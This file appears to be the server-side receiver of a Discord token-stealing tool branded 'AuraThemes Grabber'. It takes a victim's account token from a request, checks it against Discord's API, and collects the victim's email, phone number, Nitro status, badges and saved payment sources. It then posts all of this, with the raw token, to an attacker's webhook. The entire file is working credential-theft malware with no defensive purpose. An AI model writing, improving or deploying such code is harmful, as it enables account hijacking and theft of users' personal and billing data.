import { EmbedBuilder, WebhookClient } from 'discord.js';
import { webhook as WEBHOOK } from '../../../../k4itrun.config';
import fetch from 'sync-fetch';
import axios from 'axios';

const webhook = new WebhookClient({
  url: WEBHOOK,
});

export default async function handler(req, res) {
  try {
    const { query } = req;
    if (!query.data) {
      res.status(400).send('Bad Request: Missing "data" query parameter');
      return;
    }

    const { data } = query;

    let info;
    await axios.get("https://discord.com/api/v9/users/@me", {
      headers: {
        "Content-Type": "application/json",
        "Authorization": data
      }
    }).then(res => {
      info = {
        token: data,
        ...res.data
      }
    }).catch(() => {
      info = null
    })

    if (info?.id) {
      await webhook.send({
        embeds: [embedGrabber(info, data)],
        username: '@AuraThemes',
        avatarURL: 'https://i.imgur.com/WkKXZSl.gif',
      });
    }

    res.status(200).send(data);
    console.log("New visit:", data)

  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Internal Server Error');
  }
}

const emojis = {
  "themes": {
    "dark": "Dark",
    "light": "Light",
  },
  "status": {
    "online": "<:online:1129709364316491787>",
    "idle": "<:idle:1120542710424674306>",
    "dnd": "<:dnd:974692691289993216>",
    "invisible": "<:offline:1137141023529762916>",
  },
  "user": {
    "boost": [
      "<:Booster1Month:1087043238654906472> ",
      "<:Booster2Month:1087043319227494460> ",
      "<:Booster3Month:1087043368250511512> ",
      "<:Booster6Month:1087043493236592820> ",
      "<:Booster9Month:1087043493236592820> ",
      "<:booster12month:1162420359291732038> ",
      "<:Booster15Month:1051453775832961034> ",
      "<:Booster18Month:1051453778127237180> ",
      "<:Booster24Month:1051453776889917530> ",
    ],
    "payments": [
      "💳 ",
      "<:paypal:1129073151746252870> ",
    ],
    "i": [
      "<:staff:1090015968618623129> ",
      "<:partner:918207395279273985> ",
      "<:events:898186057588277259> ",
      "<:bughunter_1:874750808426692658> ",
      "<:bravery:874750808388952075> ",
      "<:brilliance:874750808338608199> ",
      "<:balance:874750808267292683> ",
      "<:early:944071770506416198> ",
      "<:bughunter_2:874750808430874664> ",
      "<:activedev:1042545590640324608> ",
      "<:verifieddeveloper:898181029737680896> ",
    ],
  },
};

const languages = {
  "zh-TW": "🇨🇳 Chinese-Taiwanese",
  "pr-BR": "🇵🇹 Portuguese",
  "sv-SE": "🇸🇪 Swedish",
  "zh-CN": "🇨🇳 Chinese-China",
  "en-GB": "🪟 English (UK)",
  "en-US": "🇺🇸 USA",
  "es-ES": "🇪🇸 Español",
  "ro": "🇷🇴 Romanian",
  "fi": "🇫🇮 Finnish",
  "vi": "🇻🇳 Vietnamese",
  "tr": "🇹🇷 Turkish",
  "ru": "🇷🇺 Russian",
  "uk": "🇺🇦 Ukrainian",
  "hi": "🇮🇳 Indian",
  "th": "🇹🇼 Taiwanese",
  "hr": "🇭🇷 Croatian",
  "it": "🇮🇹 Italianio",
  "lt": "🇱🇹 Lithuanian",
  "no": "🇳🇴 Norwegian",
  "ja": "🇯🇵 Japanese",
  "ko": "🇰🇷 Korean",
  "fr": "🇫🇷 French",
  "da": "🇩🇰 Dansk",
  "de": "🇩🇪 Deutsch",
  "pl": "🇵🇱 Polish",
  "cs": "🇨🇿 Czech",
  "el": "🇬🇷 Greek",
  "bg": "🇧🇬 Bulgarian",
  "hu": "🇳🇴🇭🇺 Hungarian",
};

function getAPI(url, token) {
  const res = fetch(url, {
    method: "GET",
    headers: {
      "Content-Type": "application/json",
      "Authorization": token,
    },
  });
  return res.status === 200 ? res.json() : "Invalid";
}

function getNitro(u) {
  let { premium_type, premium_guild_since } = u, x = "<:nitro:1016385399020601344>";
  switch (premium_type) {
    default:
      return ":x:";
    case 1:
      return x;
    case 2:
      if (!premium_guild_since) return x;
      const now = new Date();
      const m = [2, 3, 6, 9, 12, 15, 18, 24];
      let rem = 0;
      for (let i = 0; i < m.length; i++) {
        const d = m[i];
        if (Math.round((getDate(new Date(premium_guild_since), d) - now) / 86400000) > 0) {
          rem = i;
          break;
        }
      }
      return `${x} ${emojis.user.boost[rem]}`;
  }
}

function getImage(p) {
  if (!p) return false;
  return `${p}.${fetch(p).headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;
}

function getLanguage(l) {
  return languages[l] || "Unknown Language";
}

function getStatus(l) {
  return emojis.status[l] || "Unknown Status";
}

function allBabges(f) {
  return (
    (1 & f ? emojis.user.i[0] : "") +
    (2 & f ? emojis.user.i[1] : "") +
    (4 & f ? emojis.user.i[2] : "") +
    (8 & f ? emojis.user.i[3] : "") +
    (64 & f ? emojis.user.i[4] : "") +
    (128 & f ? emojis.user.i[5] : "") +
    (256 & f ? emojis.user.i[6] : "") +
    (512 & f ? emojis.user.i[7] : "") +
    (16384 & f ? emojis.user.i[8] : "") +
    (4194304 & f ? emojis.user.i[9] : "") +
    (131072 & f ? emojis.user.i[10] : "")
  ) || ":x:";
}

function embedGrabber(info, data) {
  const profile = getAPI(`https://discord.com/api/v9/users/${info.id}/profile`, info.token);
  const settings = getAPI(`https://discord.com/api/v9/users/@me/settings`, info.token);
  const payment = getAPI(`https://discord.com/api/v9/users/@me/billing/payment-sources`, info.token);

  const billing = payment?.reduce((a, e) => {
    if (e.brand && !e.invalid) a += emojis.user.payments[0];
    if (e.email) a += emojis.user.payments[1];
    return a;
  }, '') || 'No Found';

  const avatar = info.avatar ? getImage(`https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}`) : 'https://i.imgur.com/WkKXZSl.gif';

  console.log({...profile, ...settings, ...payment})

  return new EmbedBuilder()
    .setAuthor({ name: `${info.username}#${info.discriminator} | ${info.id}`, iconURL: avatar })
    .setThumbnail(avatar)
    .setColor("#c267ff")
    .setTitle('AuraThemes Dualhooked')
    .addFields(
      { name: "<a:aura:1087044506542674091> Token", value: `\`\`\`${data}\`\`\``, inline: false },
      { name: "Nitro", value: getNitro(profile), inline: true },
      { name: "Badges", value: allBabges(info.flags), inline: true },
      { name: "Phone", value: `\`${info.phone || "None"}\``, inline: true },
      { name: "Email", value: `\`${info.email || "None"}\``, inline: false },
      { name: "Billing", value: `${billing}`, inline: true },
      { name: "Langue", value: getLanguage(settings.locale), inline: true },
      { name: "Status", value: getStatus(settings.status), inline: true },
    )
    .setFooter({ text: 'AuraThemes Grabber', iconURL: 'https://i.imgur.com/WkKXZSl.gif' })
    .setTimestamp();;
}